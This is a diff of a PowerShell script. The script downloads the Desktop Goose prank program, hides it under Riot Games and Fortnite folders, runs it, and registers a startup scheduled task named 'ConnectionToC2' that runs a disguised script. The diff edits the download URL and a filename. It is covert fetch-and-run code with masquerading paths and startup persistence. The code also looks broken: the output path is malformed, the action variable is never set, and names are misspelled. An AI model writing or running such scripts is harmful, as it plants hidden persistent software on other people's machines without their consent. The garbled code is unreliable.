@@ -1,5 +1,5 @@
 # Step 1: Set the download URL and output path
-$url = "https://github.com/DeskGoose/desktop-goose/releases/download/v0.3/0.3.zip"
+$url = "https://samperson.itch.io/destop-goose?download"
 $output = "$env:USERPROFILE\C:\ProgramData\Riot Games\Metadata\Goose.zip"
 
 # Step 2: Download Desktop Goose ZIP file
@@ -15,7 +15,7 @@ Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
 Start-Process "$extractPath\GooseDesktop.exe"
 
 # Step 5: Cron the Goose
-New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsTheGoose.ps1"
+New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsTheGosse.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"
 
